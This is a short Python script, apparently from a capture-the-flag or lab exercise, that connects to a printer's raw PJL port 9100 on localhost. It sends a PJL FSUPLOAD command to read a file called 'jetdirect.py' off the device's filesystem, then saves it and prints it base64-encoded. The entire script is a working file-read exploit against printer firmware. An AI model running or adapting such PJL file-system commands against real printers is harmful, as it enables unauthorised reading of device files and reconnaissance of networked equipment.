#!/usr/bin/env python3
import base64
import socket

s = socket.socket()
s.settimeout(20)
s.connect(("127.0.0.1", 9100))
s.sendall(b'@PJL FSUPLOAD NAME="jetdirect.py" OFFSET=0 SIZE=5119\r\n')
buf = b""
try:
    while len(buf) < 6000:
        c = s.recv(65536)
        if not c:
            break
        buf += c
except socket.timeout:
    pass
s.close()
print("len", len(buf))
print(buf[:200])
if len(buf) > 500:
    open("/tmp/jetdirect.py", "wb").write(buf)
    print("B64_START")
    print(base64.b64encode(buf).decode())